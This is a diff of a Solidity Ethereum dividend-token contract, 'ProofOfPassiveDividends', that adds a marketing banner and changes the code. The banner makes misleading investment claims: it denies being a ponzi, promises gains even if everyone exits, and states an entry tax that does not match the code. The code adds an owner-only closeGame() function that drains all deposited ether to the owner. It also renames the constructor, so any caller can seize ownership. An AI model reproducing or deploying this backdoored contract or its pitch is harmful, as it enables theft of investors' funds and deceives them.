@@ -1,7 +1,47 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ProofOfPassiveDividends at 0xc1a0092a662ff7a33411ef0e283f9d8b7fae62ef
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract ProofOfPassiveDividends at 0x790284cc4910343fd936277c002791ed620238d9
 */
 pragma solidity ^0.4.21;
+
+/*
+*
+* _______    _______    _______    ______             ___     _______ 
+|       |  |       |  |       |  |      |           |   |   |       |
+|    _  |  |   _   |  |    _  |  |  _    |          |   |   |   _   |
+|   |_| |  |  | |  |  |   |_| |  | | |   |          |   |   |  | |  |
+|    ___|  |  |_|  |  |    ___|  | |_|   |   ___    |   |   |  |_|  |
+|   |      |       |  |   |      |       |  |   |   |   |   |       |
+|___|      |_______|  |___|      |______|   |___|   |___|   |_______|
+* 
+* 
+* https://www.popd.io/
+* Diff check against PoSC https://www.diffchecker.com/T1Ddu35r
+* Launching today 
+* 9:00 pm Eastern time (EST) 
+* 6:00 PM Pacific Time (PT) 
+* 2:00 AM Central European Time (CET) 
+* 1:00 AM Greenwich Mean Time (GMT)
+* 
+* POPD DApp are managed entirely on the smart contract; the purchasing process creates the tokens and puts the funds directly into the contract without human intervention. 
+* The selling process boils those tokens down and returns the funds to the seller directly. 
+* By definition, POPD is neither a pyramid nor a ponzi. That’s the point; it’s the reverse of what every lending platform states. 
+* They entitled to be real but are a pyramid. 
+* We sarcastically claim to be a pyramid but in fact are a complete legit cryptocurrency that is ironically one of the fairest and most distributed to date. 
+* POPD divs function under a perfectly autonomous simulation in which all transactions (buy/sell) are taxed 40% (15% at entry and 25% at exit). 
+* Since the smart-contract operates its own exchange and the token is autonomous, these fees are automatically split up and awarded to all token holders. 
+* Simply, each token grants you a stake of 40% of the volume the trade experiences.
+
+* Remember: All earned dividends are yours no matter what happens to the price of the POPD or to the contract. 
+* Even if the value of the tokens fall and everyone pulls out their money, that only increase your earnings.
+
++ Our program offers - 5% commission
++ Live feedback and notification upon buy/sell
++ Chart ratio of token POPD investors.
++ Max 0.5 -1 Eth pre-mine.
++ Monthly 2% reward for our large token holders as intensive for not selling
+*
+*/
+
 
 contract ProofOfPassiveDividends {
     using SafeMath for uint256;
@@ -11,13 +51,11 @@ contract ProofOfPassiveDividends {
     event Claim(address user, uint dividends);
     event Reinvest(address user, uint dividends);
 
-    address owner;
+    address owner = msg.sender;
     mapping(address => bool) preauthorized;
-    bool gameStarted;
-    
-    // deposit tax is 14.2%
-    uint constant depositTaxDivisor = 7;
-    // deposit tax is 25%
+    bool gameStarted = true;
+
+    uint constant depositTaxDivisor = 8; 
     uint constant withdrawalTaxDivisor = 4;
 
     mapping(address => uint) public investment;
@@ -29,7 +67,7 @@ contract ProofOfPassiveDividends {
     mapping(address => uint) dividendCredit;
     mapping(address => uint) dividendDebit;
 
-    function ProofOfPassiveDividends() public {
+    function ProofOfStableCoin() public {
         owner = msg.sender;
         preauthorized[owner] = true;
     }
@@ -58,8 +96,6 @@ contract ProofOfPassiveDividends {
 
     function deposit() public payable {
         require(preauthorized[msg.sender] || gameStarted);
-        
-        // Removed the referral feature due to nonsense fud! 
         depositHelper(msg.value);
         emit Deposit(msg.sender, msg.value);
     }
@@ -119,6 +155,16 @@ contract ProofOfPassiveDividends {
             y = z;
             z = (x / z + z) / 2;
         }
+    }
+    
+    modifier onlyOwner() {
+        require(msg.sender == owner);
+        _;
+    }
+    
+    function closeGame() onlyOwner public {
+        uint256 etherBalance = this.balance;
+        owner.transfer(etherBalance);
     }
 }
 
